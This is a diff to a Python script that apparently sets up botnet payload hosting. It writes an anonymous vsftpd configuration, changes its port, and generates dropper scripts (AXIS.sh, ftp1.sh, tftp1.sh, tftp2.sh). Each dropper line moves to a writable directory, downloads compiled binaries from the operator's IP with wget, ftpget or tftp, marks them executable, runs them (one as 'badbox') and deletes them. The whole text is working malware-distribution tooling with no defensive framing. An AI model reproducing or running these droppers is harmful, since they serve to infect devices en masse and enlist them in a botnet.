@@ -108,7 +108,7 @@ anon_root=/var/ftp
 anon_max_rate=2048000
 xferlog_enable=YES
 listen_address='''+ ip +'''
-listen_port=33" > /etc/vsftpd/vsftpd-anon.conf''')
+listen_port=25759" > /etc/vsftpd/vsftpd-anon.conf''')
 run("service vsftpd restart")
 for i in compileas:
     run("cp " + i + " /var/www/html")
@@ -131,7 +131,7 @@ run('echo "#!/bin/bash" > /var/www/html/AXIS.sh')
 
 for i in compileas:
     run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + ':33/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/AXIS.sh')
-    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 22482 ' + ip + ' ' + i + ' ' + i + '; chmod 777 ' + i + ' ./' + i + '; rm -rf ' + i + '" >> /var/ftp/ftp1.sh')
+    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 25759 ' + ip + ' ' + i + ' ' + i + '; chmod 777 ' + i + ' ./' + i + '; rm -rf ' + i + '" >> /var/ftp/ftp1.sh')
     run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -p 33 ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh')
     run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -p 33 -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh')
 run("service xinetd restart")
